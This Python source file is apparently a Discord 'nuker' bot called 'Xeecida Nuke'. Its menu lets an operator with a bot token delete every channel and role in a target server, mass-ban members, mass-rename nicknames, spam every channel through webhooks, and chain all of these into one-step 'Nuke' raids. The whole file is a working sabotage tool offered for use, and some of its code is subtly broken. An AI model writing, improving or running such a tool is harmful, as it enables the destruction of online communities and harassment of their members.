import discord
from discord.ext import commands
from configparser import ConfigParser
import os
from asyncio import create_task, gather
from pystyle import *
import fade
from datetime import datetime
import time as t
import ctypes

# Setup Varlue
config = ConfigParser()
config.optionxform = str
if not os.path.exists('config.ini'):
    config['Xeecida Nuke'] = {
        'TOKEN': '',
        'GUILD': ''
    }
    with open('config.ini', 'w') as file:
        config.write(file)
    
config.read('config.ini')
TOKEN = config['Xeecida Nuke'].get('TOKEN') or None
GUILD = config['Xeecida Nuke'].get('GUILD') or None
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

# Banner and Option setup
text = """
 ███▄    █  █    ██  ▄████▄  ██▓   ▓█████ ▄▄▄      ██▀███         █████ █    ██  ██▀███  ▓██   ██▓
 ██ ▀█   █  ██  ▓██▒▒██▀ ▀█ ▓██▒   ▓█   ▀▒████▄   ▓██ ▒ ██▒     ▓██     ██  ▓██▒▓██ ▒ ██▒ ▒██  ██▒
▓██  ▀█ ██▒▓██  ▒██░▒▓█    ▄▒██░   ▒███  ▒██  ▀█▄ ▓██ ░▄█ ▒     ▒████  ▓██  ▒██░▓██ ░▄█ ▒  ▒██ ██░
▓██▒  ▐▌██▒▓▓█  ░██░▒▓▓▄ ▄██▒██░   ▒▓█  ▄░██▄▄▄▄██▒██▀▀█▄       ░▓█▒   ▓▓█  ░██░▒██▀▀█▄    ░ ▐██▓░
▒██░   ▓██░▒▒█████▓ ▒ ▓███▀ ░██████░▒████ ▓█   ▓██░██▓ ▒██▒    ▒░▒█░   ▒▒█████▓ ░██▓ ▒██▒  ░ ██▒▓░
░ ▒░   ▒ ▒  ▒▓▒ ▒ ▒ ░ ░▒ ▒  ░ ▒░▓  ░░ ▒░  ▒▒   ▓▒█░ ▒▓ ░▒▓░    ░ ▒ ░    ▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░   ██▒▒▒ 
░ ░░   ░ ▒░ ░▒░ ░ ░   ░  ▒  ░ ░ ▒   ░ ░    ░   ▒▒   ░▒ ░ ▒░    ░ ░      ░▒░ ░ ░   ░▒ ░ ▒░ ▓██ ░▒░ 
   ░   ░ ░   ░░ ░ ░ ░         ░ ░     ░    ░   ▒     ░   ░       ░ ░     ░░ ░ ░    ░   ░  ▒ ▒ ░░  
         ░    ░     ░ ░         ░     ░        ░     ░         ░          ░        ░      ░ ░     
"""[:-1]
option = '''                    
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   (01) Create Channel Text        (10) Delete All Channels    ║
║   (02) Create Channel Voice       (11) Nuke (Not Ban)         ║
║   (03) Change Server Name         (12) Nuke (Ban)             ║
║   (04) Change Serve Profile       (13) Leave All Servers      ║
║   (05) Change Nickname All Members                            ║
║   (06) Spam Message All Channels                              ║
║   (07) Banall                                                 ║
║   (08) Create Role                                            ║
║   (09) Delete All Role                                        ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
'''
option = fade.purplepink((Center.XCenter(option)))
banner = fade.fire(Center.XCenter(text))

#Function
def log(level=None, msg=""): 
    time = datetime.now().strftime("%H:%M:%S")
    if level == 1:
        print(f'    \033[38;5;93m[#] [\033[34mDEBUG\033[0m\033[38;5;93m][\033[32;1m{time}\033[0m\033[38;5;93m]: {msg}\033[0m')
    elif level == 2:
        print(f'    \033[38;5;93m[*] [\033[31mERROR\033[0m\033[38;5;93m][\033[32;1m{time}\033[0m\033[38;5;93m]: {msg}\033[0m ')
    else:
        print(f'    \033[38;5;93m[+] {msg}\033[0m')

def readline(msg): 
    return input(f'    \033[38;5;93m[?] {msg}: \033[0m')

def kali():  
    prompt = f'    \033[1;31mroot@Xeecida\033[0m:\033[1;34m~\033[0m# \033[1;36m'
    user_input = input(prompt)
    print(Colors.reset, end="", flush=True)
    return user_input


def clear(delay=.2):
    t.sleep(delay)
    os.system('cls')
    print(banner)
    print(option)

def title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(f"Nuclear Fury - {title}")

def disable_resize():
    GWL_STYLE = -16
    WS_MAXIMIZEBOX = 0x10000
    WS_SIZEBOX = 0x40000
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_STYLE)
    style = style & ~WS_MAXIMIZEBOX
    style = style & ~WS_SIZEBOX
    ctypes.windll.user32.SetWindowLongW(hwnd, GWL_STYLE, style)

def transparent():
    console_handle = ctypes.windll.kernel32.GetConsoleWindow()
    opacity_level = 500
    ctypes.windll.user32.SetLayeredWindowAttributes(console_handle, 0, opacity_level, 2)

def set_cmd_size(width, height):
    os.system(f'mode con: cols={width} lines={height}')

async def create_channel(guild, name: str):
    try:
        chan = await guild.create_text_channel(name)
        log(1, f'Channel ID: \033[91m{chan.id}\033[0m created successfully')
    except:
        log(2, f'Channel ID: \033[91m{chan.id}\033[0m created Failed')


async def create_voice(guild, name: str):
    try:
        chan = await guild.create_voice_channel(name)
        log(1, f'Voice Channel ID: \033[91m{chan.id}\033[0m created successfully")')
    except:
        log(2, f'Voice Channel ID: \033[91m{chan.id}\033[0m created Failed")')

async def change_server_profile(guild):
    file_path = readline("Enter the file path for the new profile image: ")

    if os.path.exists(file_path):
        clear(1)

        try:
            with open(file_path, 'rb') as file:
                await guild.edit(icon=file.read())

            log(1, f'Successfully changed server icon for Server ID: \033[91m{guild.id}\033[0m')

        except Exception as e:
            log(2, f"Error changing server profile: {str(e)}")
    else:
        log(2, "The file path provided does not exist or is invalid.")

    clear(2)

async def change_nickname_all_members(member, nickname):
    try:
        if member.nick != nickname:
            await member.edit(nick=nickname)
            log(1, f"Nickname for {member.name} changed to {nickname}")
    except Exception as e:
        log(2, f"Error changing nickname for {member.name}: {str(e)}")

async def create_webhook_for_channel(channel, name, count, text, icon_bytes):
    try:
        webhook = await channel.create_webhook(
            name=name,
            avatar=icon_bytes.getvalue()
        )
        log(1, f"Successfully Webhook created for channel {channel.id}: {webhook.url}")
        create_task(sendch(channel, count, text))
    except Exception as e:
        log(2, f"Failed to create webhook for channel {channel.id}: {e}")

async def create_webhooks_for_all_channels(guild, name, count, text, icon_bytes):
    tasks = [
        create_webhook_for_channel(channel, name, count, text, icon_bytes)
        for channel in guild.text_channels
    ]
    await gather(*tasks)

async def sendch(channel, count, spamtext):
    for _ in range(count):
        try:
            await channel.send(spamtext)
            log(1, f"Successfully Message sent to channel: \033[91m{channel.id}\033[0m")
        except Exception:
            log(2, f"Failed to send message to channel {channel.id}")

async def killobject(obj):
    try:
        await obj.delete()
        log(1, f"Successfully Deleted object with ID: \033[91m{obj.id}\033[0m")
    except: 
        log(2, f'Failed Deleted object with ID: \033[91m{obj.id}\033[0m')

async def ban_member(member, reason="No reason provided"):
    try:
        await member.ban(reason=reason)
        log(1, f"Successfully banned {member.name} ({member.id})")
    except Exception as e:
        log(2, f"Failed to ban {member.name} ({member.id}): {e}")

async def ban_all_members(guild, reason="No reason provided"):
    tasks = []
    for member in guild.members:
        if not member.bot and member != guild.owner:
            tasks.append(ban_member(member, reason))
    await gather(*tasks)

async def create_role(guild, name):
    try:
        role = await guild.create_role(name=name)
        log(1, f"Successfully created role: {role.id}")
    except Exception as e:
        log(2, f"Failed to create role '{name}': {e}")

async def create_roles(guild, name, count):
    tasks = []
    for i in range(count):
        tasks.append(create_role(guild, name))
    await gather(*tasks)

async def leave_guild(guild):
    try:
        await guild.leave()
        log(1, f"Successfully left guild: {guild.name} (ID: {guild.id})")
    except Exception as e:
        log(2, f"Failed to leave guild {guild.name}: {str(e)}")

async def leave_all_guilds():
    tasks = []
    for guild in bot.guilds:
        tasks.append(leave_guild(guild))
    await gather(*tasks)

async def listen(guild):
    while True:
        option = int(kali())
        if option == 1:
            name = readline("Enter the name for create channel text")
            count = int(readline("Enter the count"))
            clear(1)
            await gather(*(create_channel(guild, name=name) for _ in range(count)))
            clear(2)
        elif option == 2:
            name = readline("Enter the name for create channel voice")
            count = int(readline("Enter the count"))
            clear(1)
            await gather(*(create_voice(guild, name=name) for _ in range(count)))
            clear(2)
        elif option == 3:
            name = readline("Enter the name for change server name")
            clear(1)
            try:
                await guild.edit(name=name)
                log(1, f'Server ID: \033[91m{guild.id}\033[0m changed successfully')
            except:
                log(2, f'Server ID: \033[91m{guild.id}\033[0m changed Failed')
            clear(2)
        elif option == 4:
            await change_server_profile(guild)
        elif option == 5:
            nickname = readline("Enter the new nickname for all members")
            clear(1)
            tasks = [change_nickname_all_members(member, nickname) for member in guild.members if member.nick != nickname]
            await gather(*tasks)
            clear(2)
        elif option == 6:
            name = readline("Enter the name for webhook")
            count = int(readline("Enter the count"))
            text = readline('Enter the text for spam')
            with open(readline('Enter the file path for the profile webhook'), 'rb') as f:
                icon_bytes = f.read()
            clear(1)
            await create_webhooks_for_all_channels(guild, name, count, text, icon_bytes)
            clear(2)
        elif option == 7:
            clear(1)
            await ban_all_members(guild, reason=readline("Enter reason for ban or enter for skip"))
            clear(2)
        elif option == 8:
            role_name = readline("Enter name for role")
            role_count = int(readline("Enter the count"))
            clear(1)
            await create_roles(guild=guild, name=role_name, count=role_count)
            clear(2)
        elif option == 9:
            clear(1)
            tasks = [killobject(role) for role in guild.roles]
            await gather(*tasks)
            clear(2)
        elif option == 10:
            clear(1)
            tasks = [killobject(channel) for channel in guild.channels]
            await gather(*tasks)
            clear(2)
        elif option == 11:
            clear(1)
            
            server_name = readline("Enter the new server name")
            channel_text_name = readline("Enter the name for text channels to create")
            channel_text_count = int(readline("Enter the count for text channels to create"))
            channel_voice_name = readline("Enter the name for voice channels to create")
            channel_voice_count = int(readline("Enter the count for voice channels to create"))
            role_name = readline("Enter the name for roles to create")
            role_count = int(readline("Enter the count for roles to create"))
            webhook_name = readline("Enter the name for webhook")
            webhook_icon_path = readline("Enter the file path for the profile webhook")
            webhook_count = int(readline("Enter the count for webhooks"))
            text_for_spam = readline("Enter the text for webhook spam")
            await change_server_profile(guild)  
            
            try:
                await guild.edit(name=server_name)
                log(1, f'Server ID: \033[91m{guild.id}\033[0m changed server name successfully')
            except:
                log(2, f'Server ID: \033[91m{guild.id}\033[0m failed to change server name')
            await gather(*(killobject(channel) for channel in guild.channels))
            await gather(*(killobject(role) for role in guild.roles))
            await gather(*(create_channel(guild, name=channel_text_name) for _ in range(channel_text_count)))
            await gather(*(create_voice(guild, name=channel_voice_name) for _ in range(channel_voice_count)))
            await create_roles(guild=guild, name=role_name, count=role_count)
            with open(webhook_icon_path, 'rb') as f:
                icon_bytes = f.read()
            await create_webhooks_for_all_channels(guild, webhook_name, webhook_count, text_for_spam, icon_bytes)
            
            clear(2)
        elif option == 12:
            clear(1)
            
            server_name = readline("Enter the new server name")
            channel_text_name = readline("Enter the name for text channels to create")
            channel_text_count = int(readline("Enter the count for text channels to create"))
            channel_voice_name = readline("Enter the name for voice channels to create")
            channel_voice_count = int(readline("Enter the count for voice channels to create"))
            role_name = readline("Enter the name for roles to create")
            role_count = int(readline("Enter the count for roles to create"))
            webhook_name = readline("Enter the name for webhook")
            webhook_icon_path = readline("Enter the file path for the profile webhook")
            webhook_count = int(readline("Enter the count for webhooks"))
            text_for_spam = readline("Enter the text for webhook spam")
            ban_reason = readline("Enter reason for ban or leave empty to skip")
            await change_server_profile(guild)  
            
            try:
                await guild.edit(name=server_name)
                log(1, f'Server ID: \033[91m{guild.id}\033[0m changed server name successfully')
            except:
                log(2, f'Server ID: \033[91m{guild.id}\033[0m failed to change server name')
            await gather(*(killobject(channel) for channel in guild.channels))
            await gather(*(killobject(role) for role in guild.roles))
            await gather(*(create_channel(guild, name=channel_text_name) for _ in range(channel_text_count)))
            await gather(*(create_voice(guild, name=channel_voice_name) for _ in range(channel_voice_count)))
            await create_roles(guild=guild, name=role_name, count=role_count)
            with open(webhook_icon_path, 'rb') as f:
                icon_bytes = f.read()
            await create_webhooks_for_all_channels(guild, webhook_name, webhook_count, text_for_spam, icon_bytes)
            
            await ban_all_members(guild, reason=ban_reason)
            
            clear(2)

        elif option == 13:
            clear(1)
            await leave_all_guilds()
            clear(2)


@bot.event
async def on_ready():
    title(f"Login as ({bot.user.name})")

    global GUILD

    if not GUILD:
        if bot.guilds:
            GUILD = str(bot.guilds[0].id)
        else:
            GUILD = readline("Enter target Guild ID")

    while True:
        target_guild = bot.get_guild(int(GUILD))
        if target_guild:
            log(1, f"Bot is in the server: {target_guild.name}")
            await listen(target_guild)
            break
        else:
            log(2, "Guild not found, please enter a valid Guild ID")
            GUILD = readline("Enter target Guild ID")



def main():
    global TOKEN
    while True:
        if not TOKEN:
            TOKEN = readline("Enter your TOKEN")
        
        try:
            bot.run(TOKEN, log_handler=None)
            break
        except discord.errors.LoginFailure:
            log(2, "Invalid TOKEN, please try again.")
            clear(2)
            TOKEN = None

if __name__ == '__main__':
    #Setup CMD
    set_cmd_size(125, 35)
    transparent()
    disable_resize()
    title('by Dexedus')
    clear()
    #Start Program
    main()
